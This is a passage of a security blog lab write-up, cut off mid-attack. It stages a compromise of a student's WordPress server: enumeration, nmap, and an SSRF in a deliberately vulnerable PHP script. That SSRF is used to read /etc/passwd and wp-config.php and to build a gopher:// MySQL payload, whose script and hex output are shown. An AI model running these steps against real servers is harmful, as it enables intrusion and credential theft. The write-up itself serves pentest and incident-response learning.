@@ -1,0 +1,2494 @@
+<!DOCTYPE html>
+<html lang="">
+	
+	
+
+
+	<head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta http-equiv="Cache-Control" content="public" />
+	<!-- Enable responsiveness on mobile devices -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+	
+	    
+	    
+	    
+	
+	<title>Real Gs move in silence like lasagna • Just another infosec blog</title>
+	
+	
+	<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Real Gs move in silence like lasagna"/>
+<meta name="twitter:description" content="Odie got his VPS hacked, could we find out how?"/>
+
+	<meta property="og:title" content="Real Gs move in silence like lasagna" />
+<meta property="og:description" content="Odie got his VPS hacked, could we find out how?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://maki.bzh/articles/realgs_lasagna/" />
+<meta property="article:published_time" content="2018-12-27T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2018-12-27T00:00:00&#43;00:00"/>
+
+
+    		
+	
+	
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css" integrity="sha256-90Y+fvi28WF+3jKH4tHEkoQ9WLeFKJjpvCPNOtU9ZvU= sha384-s+7l2WBKs5ChgZ+esoTV0aWZRcma7BxuSHlzBJz6PH4Cc4ZX3/ErQZtk+ZzYQy/X sha512-BiC3DH0qMCjCYqPNGAthQ95QCndm60uhfQVwhqZ2eG1zuGkP+3T1cw6PzEC4CiRfRIbd2qvyN39RoDfil/XcMA==" crossorigin="anonymous">
+	
+	
+	
+
+	<link rel="stylesheet" href="/css/hyde-hyde.css" integrity="sha256-cUUT8nKBmejGAmxYnpOnspTmwap5Sjc/nzRfeTTjgeQ=" crossorigin="anonymous">
+	<link rel="stylesheet" href="/css/custom.css" >
+	<link rel="stylesheet" href="/css/print.min.css" media="print" integrity="sha256-obkLPMZU5Kb+rPwjMazkJLfYW8H9dj6yh8Gzzs2dv5c=" crossorigin="anonymous">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g= sha384-qFIkRsVO/J5orlMvxK1sgAt2FXT67og+NyFTITYzvbIP1IJavVEKZM7YWczXkwpB sha512-UDJtJXfzfsiPPgnI5S1000FPLBHMhvzAMX15I+qG2E2OAzC9P1JzUwJOfnypXiOH7MRPaqzhPbBGDNNj7zBfoA==" crossorigin="anonymous"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE= sha384-ZoaMbDF+4LeFxg6WdScQ9nnR1QC2MIRxA1O9KWEXQwns1G8UNyIEZIQidzb0T1fo sha512-qWVvreMuH9i0DrugcOtifxdtZVBBL0X75r9YweXsdCHtXUidlctw7NXg5KVP3ITPtqZ2S575A0wFkvgS2anqSA==" crossorigin="anonymous"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="shortcut icon" href="/favicon.png">
+    	
+
+</head>
+
+
+	<body >
+				
+		<div class="sidebar">
+			<div class="container sidebar-about ">
+				<span class="site__title">
+				
+					<a href=""></a>
+				</span>
+				<a href="https://maki.bzh/">
+					
+					
+					
+					<div class="author-image">
+						<img src="https://maki.bzh/img/maki.jpg" alt="Author Image" class="img--circle img--headshot element--center"/>
+					</div>
+					
+				</a>
+				<p class="site__description">
+					<a href="https://maki.bzh/en">
+						
+					</a>
+				</p>
+				<div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/walkthrough/">
+						<span>Walkthrough</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/stupidthings/">
+						<span>Stupid Things</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/ctf/">
+						<span>CTF</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/friends/">
+						<span>Friends</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/whoami/">
+						<span>Who Am I?</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+				
+				<section class="social">
+						
+						<a href="https://twitter.com/maki_mitz" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+						
+						
+						
+						
+						
+						<a href="https://gitlab.com/maki_chaz" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						<a href="mailto:Yml0ZWRlcG91bGV0" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
+						
+						
+					  &nbsp;<a href="https://www.root-me.org/Maki-37744" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+					  
+						
+					  &nbsp;<a href="https://www.hackthebox.eu/home/users/profile/10265" target="blank" class="linklogo"><div class="rotate hackthebox_logo logohover"></div></a>
+					  
+						
+					  &nbsp;<a href="https://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
+					  
+</section>
+
+				
+				
+				<p class="copyright">
+					&copy; 2020 Maki.
+					<br/>
+					<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+					<br/>Built with, Haax, Laluka, _ACKNAK_
+					<a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+					
+				</p>
+			</div>
+		</div>
+
+		<div class="content container">
+			
+	<article>
+	<header>
+		<h1>Real Gs move in silence like lasagna</h1>
+		
+		
+<div class="post__meta">
+	
+	<i class="fas fa-calendar-alt"></i> Dec 27, 2018
+	
+	
+	<br/>
+	<i class="fas fa-clock"></i> 53 min read
+</div>
+
+
+	</header>
+	<hr/>
+	<div class="post">
+		<nav id="TableOfContents">
+<ul>
+<li><a href="#setting-up-the-environment">Setting up the environment</a></li>
+<li><a href="#red-team-time">Red team time</a>
+<ul>
+<li><a href="#fingerprinting">Fingerprinting</a>
+<ul>
+<li><a href="#wordpress">WordPress</a></li>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#bruteforce">Bruteforce?</a></li>
+</ul></li>
+<li><a href="#exploitation">Exploitation</a>
+<ul>
+<li><a href="#lfi-rce-or-ssrf">LFI, RCE or SSRF?</a></li>
+<li><a href="#server-side-request-forgery">Server Side Request Forgery</a></li>
+<li><a href="#ssrf-to-sql-injection">SSRF to SQL injection</a></li>
+<li><a href="#offline-bruteforce">Offline bruteforce</a></li>
+<li><a href="#rce-to-reverse-shell">RCE to reverse shell</a></li>
+<li><a href="#from-www-data-to-odie">From www-data to odie</a></li>
+<li><a href="#it-s-over">It&rsquo;s over&hellip;</a></li>
+</ul></li>
+<li><a href="#post-exploitation">Post exploitation</a>
+<ul>
+<li><a href="#pam-backdoor">PAM backdoor</a></li>
+<li><a href="#cleaning-time">Cleaning time</a>
+<ul>
+<li><a href="#apache-logs">Apache logs</a></li>
+<li><a href="#mysql-logs">MySQL logs</a></li>
+<li><a href="#authentication-logs">Authentication logs</a></li>
+<li><a href="#php-backdoor">PHP backdoor</a></li>
+<li><a href="#users-history">Users history</a></li>
+</ul></li>
+</ul></li>
+</ul></li>
+<li><a href="#blue-team-time">Blue team time</a>
+<ul>
+<li><a href="#forensic-environment">Forensic environment</a>
+<ul>
+<li><a href="#disk-extraction">Disk extraction</a></li>
+<li><a href="#timeline">Timeline</a></li>
+<li><a href="#memory-extraction">Memory extraction</a></li>
+<li><a href="#volatility-profile">Volatility profile</a></li>
+</ul></li>
+<li><a href="#dfir-time">DFIR time</a>
+<ul>
+<li><a href="#malicious-connection">Malicious connection</a></li>
+<li><a href="#entrypoint">Entrypoint</a></li>
+<li><a href="#reverse-shell">Reverse shell</a></li>
+<li><a href="#privilege-escalation">Privilege escalation</a>
+<ul>
+<li><a href="#www-data-to-odie">www-data to odie</a></li>
+<li><a href="#odie-to-root">odie to root</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#attack-scenario">Attack scenario</a></li>
+<li><a href="#action-plan">Action plan</a>
+<ul>
+<li><a href="#remediation">Remediation</a></li>
+<li><a href="#improvement">Improvement</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#conclusion">Conclusion</a>
+<ul>
+<li><a href="#ressources">Ressources</a></li>
+</ul></li>
+</ul>
+</nav>
+		
+
+<p><center><iframe width="560" height="315" src="https://www.youtube.com/embed/c7tOAGY59uQ" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></center></p>
+
+<p>In this article, I will introduce you to Odie&rsquo;s misfortunes. Odie is a final year student at ENSIBS Cyberdefense (France).
+He is also the biggest fan of the famous band: Iron Maiden. In addition to that, he built a small fan website for them on his Virtual Private Server.
+Given that, Odie is a poor student, he only owns one VPS for his tests, courses and others stuff.
+But, Odie comes from the most prestigious school in cyberdefense, then he knows how to protect himself against awful hackers&hellip; Well, almost.</p>
+
+<p>We will see how the Odie website got attacked and we will try to find some evidence about the attack in memory. This is what we will try to see together in this article.</p>
+
+<p>First of all, I&rsquo;m not an expert whether in red or blue team, not at all. The goal of this little practical exercises is learning new things and try to improve my skill in pentest and incident response. If you got any comments, feel free to contact me! :D</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/lCy03imiDRmzC/giphy.gif" alt="" />
+</center></p>
+
+<p>Thanks to <a href="https://twitter.com/_SIben_">SIben</a> for helping me when I was trying to find a name for this article!</p>
+
+<p><strong>UPDATE 1 XX/XX/XXXX</strong>: <a href="https://twitter.com/AZobec">Arnaud ZOBEC</a> told me that I could have done a timeline of the attacked system before RAM dump extraction. In order to correlate file schedule.</p>
+
+<p><strong>UPDATE 2 XX/XX/XXXX</strong>: <a href="https://twitter.com/FabianRODES">Fabian RODES</a> advised me to detail a little more the &ldquo;Action plan&rdquo; part with:</p>
+
+<ul>
+<li>SSH configuration hardening</li>
+<li>PHP configuration and Apache2 hardening (+ ModSecurity)</li>
+<li>WordPress hardening (configuration + iTheme Security plugin)</li>
+<li>Installing a reverse proxy and possibly blocking via geoip</li>
+<li>Installing fail2ban on SSH and Apache2</li>
+</ul>
+
+<p><strong>UPDATE 3 XX/XX/XXXX</strong>: <a href="https://twitter.com/TheLaluka">Laluka</a> told me it would be nice to add some stuff like the arbitrary PHP code.</p>
+
+<h1 id="setting-up-the-environment">Setting up the environment</h1>
+
+<p>Before attacking the server, here are its specifications:</p>
+
+<ul>
+<li>Debian 9</li>
+<li>Apache2 server</li>
+<li>MariaDB</li>
+<li>PHP 7</li>
+</ul>
+
+<p>I will share with you the Linux commands that Odie made. Perhaps you will find his&amp; choices interesting&hellip; Or not!</p>
+
+<p>During Debian installation, Odie only installed SSH server. When the system is properly installed, Odie did updates/upgrades and put his user in <code>sudo</code> group, more convenient.</p>
+
+<pre><code class="language-bash">$ su root 
+# apt update
+# apt upgrade
+# apt install sudo vim curl python python-pip
+# usermod -aG sudo odie
+# reboot
+</code></pre>
+
+<p>Now, comes the time to install and set up the web server, database and PHP for the future WordPress:</p>
+
+<pre><code class="language-bash">$ sudo apt install mariadb-client mariadb-server
+$ sudo su
+# mysql_secure_installation
+MySQL root password: mysqlroot
+Remove anonymous users: Y
+Disallow root login remotely: Y
+Remove test database and access to it: Y
+Reload priv: Y
+
+# mysql
+MariaDB [(none)]&gt; create database wp_db;
+Query OK, 1 row affected (0.00 sec)
+
+MariaDB [(none)]&gt; CREATE USER 'wp_mysql_user'@'localhost' IDENTIFIED BY '';
+Query OK, 0 rows affected (0.00 sec)
+
+MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON *.* to 'wp_mysql_user'@'localhost';
+Query OK, 0 rows affected (0.00 sec)
+
+MariaDB [(none)]&gt; FLUSH PRIVILEGES;
+Query OK, 0 rows affected (0.00 sec)
+
+MariaDB [(none)]&gt; quit
+Bye
+
+# sudo apt install php7.0 php7.0-mysql apache2 libapache2-mod-php7.0
+
+$ echo &quot;&lt;?php echo 'bite de poulet'; ?&gt;&quot; &gt; test.php
+$ curl 127.0.0.1/test.php
+bite de poulet
+</code></pre>
+
+<p>As Odie has been computer science security courses, he takes great care to run <code>mysql_secure_installation</code> to set a password on MySQL <strong>root</strong> user, remove useless data, and disable remote connection for the <strong>root</strong> user.</p>
+
+<p>In addition, he knows that it&rsquo;s a bad habit to work with the <strong>root</strong> user. Then he created a specific MySQL user for his WordPress: <strong>wp_mysql_user</strong>.</p>
+
+<p>Talking about WordPress, Odie installed it like that:</p>
+
+<pre><code class="language-bash">$ cd /var/www/html 
+$ wget https://wordpress.org/latest.tar.gz
+$ file latest.tar.gz 
+latest.tar.gz: gzip compressed data, last modified: Wed Dec 19 23:24:07 2018, from Unix
+$ tar xvfz latest.tar.gz
+$ mv wordpress/* .
+$ sudo chown -R www-data:www-data /var/www/html
+$ sudo find /var/www/html -type d -exec chmod 755 {} \;
+$ sudo find /var/www/html -type f -exec chmod 644 {} \;
+$ sudo rm index.html
+</code></pre>
+
+<p>Rights are well assigned, we have <code>755</code> on all folders, <code>644</code> on files and the owner of everything in <code>/var/www/html</code> folder is <strong>www-data</strong>. Everything is going well!</p>
+
+<p>After four clicks, the WordPress is finally installed. Odie doesn&rsquo;t like to bother too much, he didn&rsquo;t have his keepass with him so he put a temporary weak password for the admin account. He thought he is going to change it later.</p>
+
+<p>Then, Odie installed <code>docker</code>. It&rsquo;s more convenient for little tests and setting up small architecture. Here is his configuration:</p>
+
+<pre><code class="language-bash">$ sudo apt-get install \
+     apt-transport-https \
+     ca-certificates \
+     curl \
+     gnupg2 \
+     software-properties-common
+
+$ curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
+
+$ sudo add-apt-repository \
+   &quot;deb [arch=amd64] https://download.docker.com/linux/debian \
+   $(lsb_release -cs) \
+   stable&quot;
+
+$ sudo apt-get update &amp;&amp; sudo apt-get install docker-ce
+
+$ sudo usermod -aG docker odie
+</code></pre>
+
+<p>Now that everything is installed, he decided to customize his website with a more rock&rsquo;n&rsquo;roll theme.</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/env_1.png" alt="" />
+</center></p>
+
+<p>After that, Odie go back to his business. He got some work to do for his school. Hurry! It&rsquo;s the last year, he shouldn&rsquo;t miss it!</p>
+
+<h1 id="red-team-time">Red team time</h1>
+
+<p>A few days/weeks have passed since Odie put his website online. A clever student from a competing school fell on Odie&rsquo;s website. This student knows that the site belongs to Odie. This little gangster wants to hack the website and steal all ENSIBS courses!</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/hZWCe6lD1oVTq/giphy.gif" alt="" />
+</center></p>
+
+<h2 id="fingerprinting">Fingerprinting</h2>
+
+<p>This step will allow the attacker to get an accurate idea of the targeted information system. This will allow him to develop some advanced attacks against the server and get access or confidential data.</p>
+
+<h3 id="wordpress">WordPress</h3>
+
+<p>As the attacker, we know there is a website, a WordPress. There are some small interesting features on this kind of CMS, such as user enumeration:</p>
+
+<blockquote>
+<p><a href="http://192.168.122.147/?author=1">http://192.168.122.147/?author=1</a></p>
+</blockquote>
+
+<p>The above URL redirects us to:</p>
+
+<blockquote>
+<p><a href="http://192.168.122.147/index.php/author/eddiethehead/">http://192.168.122.147/index.php/author/eddiethehead/</a></p>
+</blockquote>
+
+<p>We know the first user of this WordPress: <code>eddiethehead</code>.</p>
+
+<p>Haax did a great article about &ldquo;vulnerabilities&rdquo; or dangerous features on WordPress, and he presents how to prevent them: <a href="https://haax.fr/en/articles/best-security-practice-wordpress-installation/">https://haax.fr/en/articles/best-security-practice-wordpress-installation/</a></p>
+
+<p>At least, the WordPress is up to date. <code>Wappalyzer</code> is a Firefox plugins which display versions of solutions used in the visited website.</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_1.png" alt="" />
+</center></p>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>The next scan is not very stealthy, even not at all. It&rsquo;s red team but not too much red team&hellip; :&lsquo;)</p>
+
+<pre><code class="language-nmap">host $ sudo nmap -p- -sS -sV -O -oA nmap 192.168.122.147
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-27 03:51 UTC
+Nmap scan report for 192.168.122.147
+Host is up (0.00024s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+MAC Address: 52:54:00:64:C8:8F (QEMU virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.67 seconds
+</code></pre>
+
+<p>This scan will test all TCP ports of the machine (from 1 to 65535) and will try to determine the services and associated versions. Finally, I export these reports in gnmap, nmap and xml format.</p>
+
+<p>Pro tip: to make easier large nmap scans reading:</p>
+
+<pre><code class="language-bash">host $ xsltproc nmap.xml &gt; nmap.html
+</code></pre>
+
+<p>This tool will convert the XML file to an HTML file similar to:</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_2.png" alt="" />
+</center></p>
+
+<h3 id="bruteforce">Bruteforce?</h3>
+
+<p>We could try to brute-force the SSH with <strong>eddiethehead</strong> or <strong>oddie</strong> as username, but that wouldn&rsquo;t be very discreet. So we&rsquo;re going to try something much more quiet: brute-force the files at the root with <code>DirBuster</code>.
+Yes I know, it&rsquo;s not quiet, but well, I&rsquo;m sure Odie won&rsquo;t see his logs&hellip;. At least for the moment.</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_3.png" alt="" />
+</center></p>
+
+<p>We use 40 threads because, well, I have already generated logs, then let&rsquo;s continue in that way. I will use the &ldquo;medium&rdquo; wordlist provided with DirBuster, which never really disappointed me.</p>
+
+<p>And finally, we will only look for PHP and text files in the root folder, without being recursive.  If there are no new hypotheses at the end of this first brute force, then maybe I will dig deeper. But for the moment, there are no advantages in being recursive.</p>
+
+<p>After only 8500 requests, a file got my attention: <code>test.php</code>. It is not a default WordPress file:</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_4.png" alt="" />
+</center></p>
+
+<p>Let&rsquo;s take a look at it:</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_5.png" alt="" />
+</center></p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>A file checker, let&rsquo;s see what happens if I query for <code>maki.bzh</code> (totally random choice obviously :D).</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_6.png" alt="" />
+</center></p>
+
+<p>We can only test local files. Let&rsquo;s try with the <code>index.php</code> file:</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_7.png" alt="" />
+</center></p>
+
+<p>Hmmm&hellip; It includes the webpage, we might think there is a file inclusion somewhere!</p>
+
+<h3 id="lfi-rce-or-ssrf">LFI, RCE or SSRF?</h3>
+
+<p>Indeed, we can think of a Local File Inclusion, a Remote Command Execution or Server Side Request Forgery&hellip; But thanks to the output verbosity, we assume this script is using <code>curl</code>:</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_8.png" alt="" />
+</center></p>
+
+<p>Let&rsquo;s try to change the protocol used, something like <code>file://</code> instead of <code>http://</code>. If we don&rsquo;t miss the localhost condition, it should work:</p>
+
+<blockquote>
+<p>file://localhost/etc/passwd</p>
+</blockquote>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_9.png" alt="" />
+</center></p>
+
+<p>This application allows us to include arbitrary file, great. By the way, there is a user called <strong>odie</strong> on the system. I will display the content of <code>test.php</code>, just to be clear about the vulnerability:</p>
+
+<blockquote>
+<p>file://localhost/var/www/html/test.php</p>
+</blockquote>
+
+<pre><code class="language-php">&lt;?php 
+include_once &quot;config_test.php&quot;;
+?&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+	&lt;title&gt;Super curling&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;
+		URL Checker - Beta: 
+		&lt;input type=&quot;text&quot; name='url' /&gt;		
+	&lt;/form&gt;
+&lt;?php
+if (isset($_POST['url'])&amp;&amp;!empty($_POST['url']))
+{
+		$url = $_POST['url'];
+			$content_url = getUrlContent($url);
+}
+else
+{
+		$content_url = &quot;&quot;;
+}
+
+if(isset($_GET['debug']))
+{
+		show_source(__FILE__);
+}
+?&gt; 
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Same operation to get the <code>config_test.php</code> content:</p>
+
+<blockquote>
+<p>file://localhost/var/www/html/config_test.php</p>
+</blockquote>
+
+<pre><code class="language-php">&lt;?php
+function safe($url)
+{
+	$tmpurl = parse_url($url, PHP_URL_HOST);
+	if($tmpurl != &quot;localhost&quot; and $tmpurl != &quot;127.0.0.1&quot;)
+	{
+		var_dump($tmpurl);
+		die(&quot;&lt;h1&gt;Only access to localhost&lt;/h1&gt;&quot;);
+	}
+	return $url;
+}
+
+function getUrlContent($url){
+	$url = safe($url);
+	$url = escapeshellarg($url);
+	$pl = &quot;curl -v &quot;.$url;
+	echo $pl;
+	$content = shell_exec($pl);
+	echo $content;
+	return $content;
+}
+?&gt;
+</code></pre>
+
+<p>No more doubt, we got an SSRF in front of us. The RCE is not possible because of <code>escapeshellarg();</code> function in PHP.</p>
+
+<h3 id="server-side-request-forgery">Server Side Request Forgery</h3>
+
+<p>So now that I know there is an SSRF, we have to find a compatible service to interact with the system. There is a WordPress installed, then we can think that MySQL is being used. Let&rsquo;s try to get the configuration file from the CMS:</p>
+
+<blockquote>
+<p>file://localhost/var/www/html/wp-config.php</p>
+</blockquote>
+
+<pre><code class="language-php">&lt;?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to &quot;wp-config.php&quot; and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://codex.wordpress.org/Editing_wp-config.php
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wp_db');
+
+/** MySQL database username */
+define('DB_USER', 'wp_mysql_user');
+
+/** MySQL database password */
+define('DB_PASSWORD', '');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8mb4');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         ')Rd+$da6g*B/tnJv#L[l$Ms3O+;YGx5(;fd$%eA16&amp;Tc;6Gh|!nnrv23K1B&gt;/=C?');
+define('SECURE_AUTH_KEY',  'x8K1X9U?.Kf!sxlL0Mt6&amp;5 -wa,`&gt;HjBhp,j@LWyIIcwW#U)`m.C(6{v)EKfl|!&lt;');
+define('LOGGED_IN_KEY',    '~ZW7f:RWz,6s?fXB=EqZ/$j.d]@d^{l=q1SnCySLm,$]9Y9B&gt;lq n?]S&gt;10=F`9c');
+define('NONCE_KEY',        '@rs_~hBZ2 ;~A6/eH7C&amp;Q@JB}Af$IF=N5_CbuXq?DT|_n{TsFq|_g}[I&lt;)juXM=i');
+define('AUTH_SALT',        'SbuXoB.8TYTm`%WEKRN/9Me8O9C&gt;]K((y}s/3~IwpMBTrI6(&amp;JiD0&lt;nuf[huStMI');
+define('SECURE_AUTH_SALT', 'w(wnD$yjnc@z6]Kal{.=Kv~G5{u$j=ZnKaN,#`Dl7xbS_(3OVi~w]0.Hk;wQ#lbB');
+define('LOGGED_IN_SALT',   '-1.h]p gm?rf1?6byNfAbK:VJ}3x&amp;dx2Gf-QS%a&lt;/GHh8t{to1T5a~lQ=408,PyM');
+define('NONCE_SALT',       '4v6W.P-H:4}wJdOo9XNtO0_eCp e9xpSi4m5Q6&lt;htwNo`JKynG2iq8A}[VCh[&amp;eS');
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the Codex.
+ *
+ * @link https://codex.wordpress.org/Debugging_in_WordPress
+ */
+define('WP_DEBUG', false);
+
+/* That's all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+	define('ABSPATH', dirname(__FILE__) . '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+ 
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>There are some interesting things to notice:</p>
+
+<ul>
+<li>MySQL is used ;</li>
+<li>There is no password on the MySQL user <strong>wp_mysql_user</strong> ;</li>
+<li>The database name is <code>wp_db</code>.</li>
+</ul>
+
+<p>There are many articles on the internet about SSRF exploitation with MySQL. Let&rsquo;s see how I can take advantage of this.</p>
+
+<h3 id="ssrf-to-sql-injection">SSRF to SQL injection</h3>
+
+<p>On my laptop, I installed MySQL (MariaDB), created a database called <code>wp_db</code>, created a user called <code>wp_mysql_user</code> without authentication password, downloaded and install WordPress:</p>
+
+<pre><code class="language-bash">host $ mysql -u root -p 
+MariaDB &gt; create database wp_db;
+MariaDB &gt; CREATE USER 'wp_mysql_user'@'localhost' IDENTIFIED BY '';
+MariaDB &gt; GRANT ALL PRIVILEGES ON *.* to 'wp_mysql_user'@'localhost';
+</code></pre>
+
+<p>Once my personal environment is similar to the target one, here is my MySQL request to get the Wordpress credentials:</p>
+
+<pre><code class="language-bash">host $ mysql -u wp_mysql_user
+MariaDB [(none)]&gt; select user_login,user_pass from wp_db.wp_users;
++--------------+------------------------------------+
+| user_login   | user_pass                          |
++--------------+------------------------------------+
+| test_user    | SomeWordpressHash                  |
++--------------+------------------------------------+
+1 row in set (0.00 sec)
+
+host $ mysql -h localhost -u wp_mysql_user -e &quot;select user_login,user_pass from wp_db.wp_users;&quot;
++--------------+------------------------------------+
+| user_login   | user_pass                          |
++--------------+------------------------------------+
+| test_user    | SomeWordpressHash                  |
++--------------+------------------------------------+
+</code></pre>
+
+<p>The second request is just a one liner specifying that it is necessary to go through the localhost.</p>
+
+<p>To execute SQL commands, I will need to look at the query in Wireshark and understand which data is sent and how. The following article will probably explain this better than me: <a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p>
+
+<p>The mentioned article shows us how to simulate the MySQL request in a local environment, retrieve data transmitted and replay them. This means that MariaDB has no specific protection against regame or authenticity.</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/red_10.gif" alt="" />
+</center></p>
+
+<p>Displayed bytes at the end of the above GIF will be used as payload to get the username and hashed password from the WordPress database. With a little python script, stolen to our asian friends, I will be able to generate the complete payload:</p>
+
+<pre><code class="language-python">#!/usr/bin/python2
+
+def result(s):
+  a = [s[i:i+2] for i in xrange(0, len(s), 2)]
+  return &quot;gopher://127.0.0.1:3306/_%&quot; + &quot;%&quot;.join(a)
+
+if __name__ == &quot;__main__&quot;:
+  import sys
+  s = sys.argv[1]
+print result(s)
+</code></pre>
+
+<p>In fact, this python script will just add <code>gopher://127.0.0.1:3306/_</code> in front of our payload and add a <code>%</code> every two characters. Otherwise, the web server will not take the data as hex data.</p>
+
+<pre><code class="language-bash">host $ cat ssrf_mysql2 | xxd -p | tr -d '\n'
+ac00000185a23f000000000121000000000000000000000000000000000000000000000077705f6d7973716c5f7573657200006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404393230360f5f636c69656e745f76657273696f6e0731302e312e3337095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c300000000373656c65637420757365725f6c6f67696e2c757365725f706173732066726f6d2077705f64622e77705f75736572730100000001
+
+host $ ./parse.py ac00000185a23f000000000121000000000000000000000000000000000000000000000077705f6d7973716c5f7573657200006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404393230360f5f636c69656e745f76657273696f6e0731302e312e3337095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c300000000373656c65637420757365725f6c6f67696e2c757365725f706173732066726f6d2077705f64622e77705f75736572730100000001
